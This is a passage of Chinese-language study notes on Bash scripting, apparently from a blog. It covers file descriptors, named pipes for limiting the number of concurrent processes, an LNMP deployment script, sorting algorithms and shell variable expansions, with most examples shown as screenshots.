alt="image-20220320202903540"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320203058318.png" alt="image-20220320203058318"></p><p>还能给在命令中调用它</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320203141142.png" alt="image-20220320203141142"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320203356550.png" alt="image-20220320203356550"></p><p>关闭文件描述符</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320203427171.png" alt="image-20220320203427171"></p><p>关掉后就用不了了</p><p>上面案例中首先创建了一个仅可以重定向输出的文件描述符（12），可以通过&amp;12调用该文件描述符，使用echo将消息重定向输出到12这个文件描述符就等同于输出到文件test.txt。但是，当调用该文件描述符进行重定向导入时会失败，该文件描述符不支持重定向输入。</p><p>创建只可重定向输入的test文件</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320204328094.png" alt="image-20220320204328094"></p><p>注意：文件仅能被输出一次 后面想要继续输出的话得再次exec 13&lt;test.txt。但是重定向输出的文件可以被输入很多次</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320204830810.png" alt="image-20220320204830810"></p><p>同样 重定向输入的文件不支持输出</p><p>关闭的话也就是&lt;与&gt;的差别</p><p>能不能创建一个既可以输出又可以实现输入功能的文件描述符呢？答案是可以的！</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320205104614.png" alt="image-20220320205104614"></p><p>但是同样的  我们的重定向输入的文件仅可以被输出一次</p><p>关闭的话只要一个exec 14&lt;&amp;-就够了</p><p>下面看一个非常容易导致数据丢失的案例，在生产环境中如果不注意这样的问题，有可能会付出惨痛的代价。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320205912759.png" alt="image-20220320205912759"></p><p>可以看到 关掉文件描述符的话用&gt;或者&lt;都可以</p><p>继续继续</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320210116337.png" alt="image-20220320210116337"></p><p>可以看到这样原数据会丢失</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320210523299.png" alt="image-20220320210523299"></p><p>这样数据就不会覆盖</p><p>使用cat命令可以通过文件描述符读取文件的全部内容。另外，read命令后跟-u选项也可以通过文件描述符读取文件内容，但不同的是，read命令每次仅读取一行数据。通过下面的演示，再多学习一些文件描述符的细节技术。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320213215829.png" alt="image-20220320213215829"></p><p>从上面这一系列的操作演示中，我们要理解，文件描述符并不是简单地对应一个文件的。文件描述符中还包含有很多文件相关的信息，如权限、文件偏移量等。文件偏移量更像一个指针，它指向某个文件的位置，默认情况下该指针指向的是文件的起始位置，当使用read命令读取一行数据后，该指针会指向下一行数据，再使用read读取一行内容，指针再往下移动一行，依此类推，直到文件结束。通过文件描述符读取文件行的流程如下图所示。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220320213435916.png" alt="image-20220320213435916"></p><p> 因为cat命令会读取文件的全部内容，所以当我们使用cat命令读取文件描述符时，文件描述符的指针会一次性跳到文件的末尾，一旦到了文件末尾，则再通过文件描述符读取文件的内容就为空，因为没有内容可读了。但是可以重新打开文件描述符，还可以再次从开始位置读取数据内容。</p><p>同样的道理，也可以每次仅读取文件的任意个字符。这样的话，指针就会停留在特定字符的后面，等待下一次再通过文件描述符读取文件内容时，就会继续从这个位置读取后续的内容。read命令可以通过-n选项指定读取任意字符的数据。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320214110470.png" alt="image-20220320214110470"></p><p>值得注意的是    每当一个行的所有字符读完后</p><p>下一次read -u12 -n 都是空白的 然后在下一次运行才会继续读取(只针对 read -u12 -n)</p><p>不仅查看内容会导致指针移动，写入数据同样也会导致指针移动。通过文件描述符追加写入数据后，就不能再查看了，因为指针已经移动到了文件末尾的位置。</p><p>创建文件描述符时，如果文件描述符对应的文件不存在，系统会自动创建一个新的空文件。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320215204711.png" alt="image-20220320215204711"></p><p>可以看到通过文件描述符查看为空</p><p>面的操作，先开启一个可读写的文件描述符，然后通过重定向输出的方式往文件中写入两行数据，同时文件描述符中的偏移量指针也随之往下移动。当使用文件描述符读取数据时，指针已经移动到最后，此时再使用cat命令查看文件后续内容则为空，但是前面写入文件的内容不会丢失，使用文件名的方式直接访问，数据都还在。</p><h4 id="2）命名管道"><a href="#2）命名管道" class="headerlink" title="2）命名管道"></a>2）命名管道</h4><p>接下来，学习命名管道的知识。管道是进程间通信的一种方式，前面已经介绍了匿名管道，使用|符号就可以创建一个匿名管道，顾名思义，系统会自动创建一个可以读写数据的管道，但是这个管道并没有名称。一个程序往管道中写数据，另一个程序就可以从管道中读取数据。但是匿名管道仅可以实现父进程与子进程之间的数据交换，能不能实现任意两个无关的进程之间的通信呢？答案是肯定的，使用命名管道，也叫FIFO文件。</p><p>命名管道具有如下几个特征。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">● FIFO文件由命令创建（<span class="hljs-built_in">mknod</span>或<span class="hljs-built_in">mkfifo</span>命令），可以在文件系统中直接看到。<br>● 写入管道的数据一旦被读取后，就不可以再重复读取。<br>● 进程往命名管道中写数据时，如果没有其他进程读取数据，则写进程会被阻塞。<br>● 进程尝试从命名管道中读取数据时，如果管道中没有数据，则读进程会被阻塞。<br>● 命名管道中的数据常驻内存，并不实际写入磁盘，读写效率会更高。<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153259632.png" alt="image-20220321153259632"></p><p>创建命名管道，不指定权限</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153332741.png" alt="image-20220321153332741"></p><p>创建命名管道，并指定全年</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153444134.png" alt="image-20220321153444134"></p><p>查看文件属性 第一列为P</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153650766.png" alt="image-20220321153650766"></p><p>写阻塞（特征  无法返回输入框）</p><p>使用echo命令将数据重定向导入管道，因为暂时没有其他进程从管道中读取数据，所以写数据的echo命令被阻塞。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153722376.png" alt="image-20220321153722376"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153729376.png" alt="image-20220321153729376"></p><p>开启另一个命令终端窗口，执行读操作时，回到第一个窗口写阻塞会自动被解除（特征：返回输入框）。</p><p>与上面的演示类似，反之当从命名管道中读取数据时，如果管道中并没有数据，读进程会被阻塞。因为前面的操作已经将pie_file1中的数据读出，此时管道中已没有任何数据。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153819866.png" alt="image-20220321153819866"></p><p>可以看到被阻塞</p><p>我们开启另一个命令终端窗口，执行写操作时，再回到第一个窗口读阻塞会自动被解除。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153943914.png" alt="image-20220321153943914"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153924183.png" alt="image-20220321153924183"></p><p>可以看到本来那个窗口回显123并且解除</p><p>说了这么多文件描述符与命名管道的铺垫，该进入正题了，对于多进程的脚本如何控制进程的数量呢？通过命名管道的阻塞功能就可以有效地阻止开启过多的进程！但是只有命名管道还不够，正常情况下cat命令读取命名管道数据会一次性全部读完，这里需要每次仅读取一行数据，而read命令通过文件描述符就可以读取文件的行数据。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321155401648.png" alt="image-20220321155401648"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321155222427.png" alt="image-20220321155222427"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321155235041.png" alt="image-20220321155235041"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321155350575.png" alt="image-20220321155350575"></p><p>有了这样的技巧可以控制进程数量后，就可以再次修改前面的ping测试脚本，实现一个可以任意控制进程数量的多进程ping测试脚本。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321162026865.png" alt="image-20220321162026865"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321162038816.png" alt="image-20220321162038816"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321162144959.png" alt="image-20220321162144959"></p><p>虽然这样速度很慢</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321162847671.png" alt="image-20220321162847671"></p><p>而且还得再搞个重新排列 把报错弄掉</p><h3 id="4-10-实战案例：一键源码部署LNMP的脚本"><a href="#4-10-实战案例：一键源码部署LNMP的脚本" class="headerlink" title="4.10 实战案例：一键源码部署LNMP的脚本"></a>4.10 实战案例：一键源码部署LNMP的脚本</h3><p>在生产环境中为服务器安装部署软件包是运维人员非常重要的一项工作，一般可以通过RPM、YUM或者源码安装部署软件包。这些方式中源码包安装方式具有很多RPM所不具备的优势，比如可以自定义安装路径、自定义模块、获得更新的版本等，但是，使用源码包安装软件往往也是最复杂的一种方式。怎么办呢？我们即需要源码包的灵活性，又不希望每次安装都很麻烦。在生产环境中一般都会选择将源码包的安装步骤写入脚本，实现一键安装软件包的功能，也有部分企业是将源码自定义制作成个性化的RPM包。</p><p>下面的案例以使用源码部署目前比较主流的LNMP环境为例，编写一个自动化部署脚本。实现这样的脚本需要编写大量的代码，如果没有函数，脚本会显得杂乱无章，本案例会使用函数的方式编写。</p><p>首先通过变量设置一些颜色属性，方便在脚本运行过程中给使用者恰当颜色的信息提示。然后测试系统的YUM源是否可以使用，如果没有YUM源则无法完成源码包相关依赖软件的安装，如果YUM源可用就可以通过install_deps函数安装LNMP相关的依赖软件包。最后就是定义一系列的函数进行源码包的安装、修改配置文件、生成systemd启动配置文件。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223032441.png" alt="image-20220321223032441"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223053366.png" alt="image-20220321223053366"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223104790.png" alt="image-20220321223104790"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223112186.png" alt="image-20220321223112186"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223119959.png" alt="image-20220321223119959"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223131244.png" alt="image-20220321223131244"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223233669.png" alt="image-20220321223233669"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223240936.png" alt="image-20220321223240936"></p><h3 id="4-11-递归函数"><a href="#4-11-递归函数" class="headerlink" title="4.11 递归函数"></a>4.11 递归函数</h3><p>一个会自己直接或间接调用自己的函数称为递归函数。下面用递归函数的方式再次编写一个求斐波那契数列的和的脚本。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321224422133.png" alt="image-20220321224422133"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321224430446.png" alt="image-20220321224430446"></p><p>需要注意的是，因为递归函数会自己调用自己，如果不设置任何退出机制，就会变成死循环递归调用，所以一般都需要设置一个条件，当条件触发后就结束递归。另外一个需要注意的是，递归函数仅当递归结束后，之前启动的调用函数才会依次关闭，如果递归次数特别多，会有大量的函数被反复调用而不关闭，非常容易导致内存中的数据溢出，进而导致程序出错。上面的脚本随着计算数量的增大计算性能会降低，</p><p>如图4-9所示，如果想得到第五个斐波那契数，就需要将前面所有的斐波那契数重新计算一遍，所以在可使用循环解决的问题中应该尽量避免过多使用递归函数，在一些不需要递归计算的环境中可以考虑使用递归函数。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321224504844.png" alt="image-20220321224504844"></p><h3 id="4-12-排序算法之冒泡排序"><a href="#4-12-排序算法之冒泡排序" class="headerlink" title="4.12 排序算法之冒泡排序"></a>4.12 排序算法之冒泡排序</h3><p>对数据进行分析时经常需要进行排序处理，比如按占用CPU的时间对进程排序、按出现的次数频率对数据排序、按大小对数据进行排序等。对数据的排序可用使用sort命令，也可尝试自己编写排序脚本，自定义排序算法。常见的排序算法有很多，如冒泡排序、插入排序、选择排序、快速排序、堆排序、归并排序、希尔排序、二叉树排序等。</p><p>冒泡排序是一种比较简单的排序算法。冒泡排序不断地比较相邻的两个数据的大小，根据大小进行排序（升序或降序），如果顺序不对则彼此交换位置，依此类推，当所有的数据都比较完成后，一定可以找出一个最大或最小的值。通过彼此交换位置慢慢把大的或小的数据浮现出来，就像气泡浮出水面一样，所以这种算法被称为“冒泡排序”。如图4-10所示是冒泡排序的流程图。假设有7个待排序的数字，我们进行完第一轮的6次比较后一定能得出一个最大值，第一个数值冒泡出来。同理，第二轮进行5次[插图]比较后一定可以获得剩余所有数字中的最大值。依此类推，进行6轮这样的比较后，所有数据会按从小到大的顺序排列。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321224829904.png" alt="image-20220321224829904"></p><p>先写一个简单的6个数字排序的脚本，看看冒泡排序的代码如何实现。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321225142242.png" alt="image-20220321225142242"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321225149011.png" alt="image-20220321225149011"></p><p>下面通过冒泡算法编写一个根据当前系统所有进程所占物理内存大小的排序脚本。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321231224267.png" alt="image-20220321231224267"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321231231617.png" alt="image-20220321231231617"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321231101939.png" alt="image-20220321231101939"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321231118097.png" alt="image-20220321231118097"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321231203498.png" alt="image-20220321231203498"></p><h3 id="4-13-排序算法之快速排序"><a href="#4-13-排序算法之快速排序" class="headerlink" title="4.13 排序算法之快速排序"></a>4.13 排序算法之快速排序</h3><p>快速排序简称快排，是在冒泡排序的基础上演变出来的算法。这种算法的主要思想是挑选一个基准数字，然后把所有比该数字大的数字放到该数字的一边，其他比该数字小的数字放到该数字的另一边，然后递归对该基准数字两边的所有数字做相同的比较排序，直到所有数字都变为有序数字。快速排序的效率取决于挑选的基准数字，如果基准数字是一个比较折中的数字，则基准数字两边就比较均衡，这样比较的次数就会大大减少。如果基准数字偏大或偏小，就会导致基准数字两边的数字个数不均衡，最终需要进行数字比较的次数依然很多。通常我们会选择第一个元素或最后一个元素作为基准数字。</p><p>下面一起看看如何使用Shell脚本实现快速排序算法。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322121940248.png" alt="image-20220322121940248"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322122023982.png" alt="image-20220322122023982"></p><h3 id="4-14-排序算法之插入排序"><a href="#4-14-排序算法之插入排序" class="headerlink" title="4.14 排序算法之插入排序"></a>4.14 排序算法之插入排序</h3><p>插入排序顾名思义就是提取一个数字后，对已排序的数字从后往前依次比较，选择合适的位置插入。这种算法的优点是，任意一个数字可能不需要对比所有数字就可以找到合适的位置，当然最差的情况也有可能需要对比所有数字后才能确定合适的位置。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322133840224.png" alt="image-20220322133840224"></p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220322133933793.png" alt="image-20220322133933793"></p><h3 id="4-15-排序算法之计数排序"><a href="#4-15-排序算法之计数排序" class="headerlink" title="4.15 排序算法之计数排序"></a>4.15 排序算法之计数排序</h3><p>前面学习的算法中无论是冒泡排序还是快速排序都是基于比较进行排序的，还有一种特殊的排序算法是不需要进行比较的，名为计数排序。这种排序算法的核心思想就是多创建一个数组，用于统计待排序数组中每个元素出现的次数。该算法的核心理念如图4-14所示，2、1、2、7、3、8是需要排序的数字，这个数字序列中的最大值为8，需要额外创建一个计数数组count，该数组有9个下标，分别为count[0]～count[8], count数组中所有元素的初始值为0，接着用待排序数组的元素值，作为计数数组的下标进行自加运算。如第一个数为2，就执行count[2]++，第三个待排序的数还是2，就再执行count[2]++。依此类推，使用count数组统计所有待排序数字出现的次数。最终，根据count数组元素的值打印对应的下标即可，如count[0]的值是0，就不打印，count[1]的值是1就打印一次1,count[2]的值是2就打印两次2，所有下标打印完就完成了数字的排序工作。</p><p>写一个可以自动分析待排序数组的最大值，自动创建计数数组赋初始值，最终实现排序功能的完整代码案例。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322135608861.png" alt="image-20220322135608861"></p><h2 id="第5章-一大波脚本技巧正向你走来"><a href="#第5章-一大波脚本技巧正向你走来" class="headerlink" title="第5章 一大波脚本技巧正向你走来"></a>第5章 一大波脚本技巧正向你走来</h2><h3 id="5-1-Shell八大扩展功能之花括号"><a href="#5-1-Shell八大扩展功能之花括号" class="headerlink" title="5.1 Shell八大扩展功能之花括号"></a>5.1 Shell八大扩展功能之花括号</h3><p>Shell脚本支持七种类型的扩展功能：花括号扩展（braceexpansion）、波浪号扩展（tilde expansion）、参数与变量替换（parameter and variable expansion）、命令替换（commandsubstitution）、算术扩展（arithmetic expansion）、单词切割（word splitting）和路径替换（pathname expansion）。这些扩展技巧在编写脚本时非常有用。</p><p>在Shell脚本中可以使用花括号对字符串进行扩展。我们可以在一对花括号中包含一组以分号分隔的字符串或者字符串序列组成一个字符串扩展，注意最终输出的结果以空格分隔。使用该扩展时花括号不可以被引号引用（单引号或双引号），在括号的数量必须是偶数个。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322143320926.png" alt="image-20220322143320926"></p><p>字符串序列后面可以跟一个可选的步长整数，该步长的默认值为1或-1。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322143429729.png" alt="image-20220322143429729"></p><p>使用花括号扩展时在花括号前面和后面都可以添加可选的字符串，且花括号扩展支持嵌套。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322143616912.png" alt="image-20220322143616912"></p><p>注意：花括号内两个字符的中间不能有空格,不然会原符号输出</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322144007436.png" alt="image-20220322144007436"></p><p>上面例子看出来花括号支持嵌套。</p><p>但是有意思的是再嵌套内添加空格  则添加空格的那一层会原符号输出，其他层则继续套接</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322144706203.png" alt="image-20220322144706203"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322145806912.png" alt="image-20220322145806912"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322145926767.png" alt="image-20220322145926767"></p><p>利用扩展备份文件</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322150307819.png" alt="image-20220322150307819"></p><p>利用扩展重命名</p><h3 id="5-2-Shell八大扩展功能之波浪号"><a href="#5-2-Shell八大扩展功能之波浪号" class="headerlink" title="5.2 Shell八大扩展功能之波浪号"></a>5.2 Shell八大扩展功能之波浪号</h3><p>波浪号在Shell脚本中默认代表当前用户的家目录，我们也可以在波浪号后面跟一个有效的账户登录名称，可以返回特定账户的家目录。但是，注意账户必须是系统中的有效账户。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322150823012.png" alt="image-20220322150823012"></p><p>波浪号扩展中使用～+表示当前工作目录，～-则表示前一个工作目录。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322151114669.png" alt="image-20220322151114669"></p><h3 id="5-3-Shell八大扩展功能之变量替换"><a href="#5-3-Shell八大扩展功能之变量替换" class="headerlink" title="5.3 Shell八大扩展功能之变量替换"></a>5.3 Shell八大扩展功能之变量替换</h3><p>在Shell脚本中我们会频繁地使用$对变量进行扩展替换，变量字符可以放到花括号中，这样可以防止需要扩展的变量字符与其他不需要扩展的字符混淆。如果$后面是位置变量且多于一个数字，必须使用{}，如$1、${11}、${12}。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322151501424.png" alt="image-20220322151501424"></p><p>如果变量字符串前面使用感叹号（!），可以实现对变量的间接引用，而不是返回变量本身的值。感叹号必须放在花括号里面，且仅能实现对变量的一层间接引用。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322151628182.png" alt="image-20220322151628182"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322151832013.png" alt="image-20220322151832013"></p><p>变量替换操作还可以测试变量是否存在及是否为空，若变量不存在或为空，则可以为变量设置一个默认值。Shell脚本支持多种形式的变量测试与替换功能，变量测试具体语法如下表</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322151908945.png" alt="image-20220322151908945"></p><p>变量animals未定义，因此使用echo返回变量的结果为空。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322175611800.png" alt="image-20220322175611800"></p><p>根据变量替换的规则，当变量未定义或者变量定义了但是值为空时，返回关键字dog。但也仅仅返回关键字dog，不会因此改变animals的值，所以animals的值还是空。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322175654422.png" alt="image-20220322175654422"></p><p>我们再通过示例验证一下即便定义了animals变量，但值为空时，依然会返回关键字。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322175754540.png" alt="image-20220322175754540"></p><p>不管变量未定义还是变量的值为空，下面的示例都会返回关键字并且会修改变量的值。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322180023387.png" alt="image-20220322180023387"></p><p>而当变量的值为非空时，这种扩展将直接返回变量自身的值。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322180716419.png" alt="image-20220322180716419"></p><p>偶尔，我们还可以使用变量替换实现脚本的报错功能，判断一个变量是否有值，没有值或者值为空时就可以返回特定的报错信息。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322181351511.png" alt="image-20220322181351511"></p><p>再看一个与前面相反的结果，当变量有值且非空时，返回关键字，而当变量没有定义或值为空时，则返回空。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322181547984.png" alt="image-20220322181547984"></p><p>前面章节中我们已经编写了几个创建系统账户并配置密码的案例，结合这里我们学的变量替换功能，还可以继续对脚本进行优化，实现更多的功能。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322183103520.png" alt="image-20220322183103520"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322183144340.png" alt="image-20220322183144340"></p><p>变量的替换就这些吗？当然不是！变量替换还有非常实用的字符串切割与掐头去尾功能</p><p>字符串切割与掐头去尾具体语法</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322183946887.png" alt="image-20220322183946887"></p><p>这几种对变量的替换方式，都不会改变变量自身的值</p><p>首先定义一个变量home，变量的偏移量从0开始递增，分别表示变量值每个字符的位置。示例中变量home的具体位置偏移量如下图所示。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322184903084.png" alt="image-20220322184903084"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322185342707.png" alt="image-20220322185342707"></p><p>从给定的位置偏移量开始对变量进行切割，如果设置了特定的长度，则截取给定长度的值后结束，如果没有指定截取的长度，则直接截取到变量的末尾。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322185413332.png" alt="image-20220322185413332"></p><p>从位置2开始截取到变量末尾</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322185446489.png" alt="image-20220322185446489"></p><p>从位置14开始截取6个字符后结束</p><p>下面通过几个示例介绍对变量的掐头和去尾操作。使用#可以实现掐头，使用%可以实现去尾。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322185951944.png" alt="image-20220322185951944"></p><p>从左往右将匹配的Th删除</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322190246150.png" alt="image-20220322190246150"></p><p>变量开头无法匹配oak，返回原值</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322190519260.png" alt="image-20220322190519260"></p><p>匹配y及其左边的所有内容删除</p><p>因为一个#表示最短匹配，所以执行上面的命令仅删除第一个y及其左边的所有内容。</p><p>如果需要做最长匹配，也就是一直找到最后一个指定的字符，并将该字符及其前面的所有字符全部删除就需要使用两个#符号。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322191050138.png" alt="image-20220322191050138"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322191339692.png" alt="image-20220322191339692"></p><p>从右往左删除efs</p><p>从右往左删除，直到匹配d为止。一个%从右往左匹配到第一个d即停止，两个%也会从右往左匹配，但是要匹配到最后一个d才会停止</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322192443561.png" alt="image-20220322192443561"></p><p>如果变量是数组类型的变量，这些扩展还有效吗？答案是肯定的，感慨Shell的强大！</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322193921151.png" alt="image-20220322193921151"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322194446051.png" alt="image-20220322194446051"></p><p>根据数组的某个元素进行掐头操作</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322195007449.png" alt="image-20220322195007449"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322195033237.png" alt="image-20220322195033237"></p><p>对数组的所有元素进行掐头</p><p>通过掐头去尾的方式可以实现对文件批量修改文件名或扩展名，下面是两个批量修改文件扩展名的案例。一个脚本是批量修改当前目录下的文件扩展名，另一个脚本是批量修改指定目录下的文件扩展名。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322203049062.png" alt="image-20220322203049062"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322204112395.png" alt="image-20220322204112395"></p><p>最后通过下表学习变量内容的统计与替换，通过这一组功能我们可以查找变量、统计变量内容的字符数及对变量内容进行替换操作。</p><p>变量内容的统计与替换</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322204144314.png" alt="image-20220322204144314"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322204923110.png" alt="image-20220322204923110"></p><p>echo ${!x@}</p><p>echo ${!x*}列出已x开头的所有变量名</p><p>但是这两个也有差别</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322211455098.png" alt="image-20220322211455098"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322211519485.png" alt="image-20220322211519485"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322225541250.png" alt="image-20220322225541250"></p><p>输出数组所有下标</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322225625539.png" alt="image-20220322225625539"></p><p>declare定义关联数组</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220322230024753.png" alt="image-20220322230024753"></p><p>echo 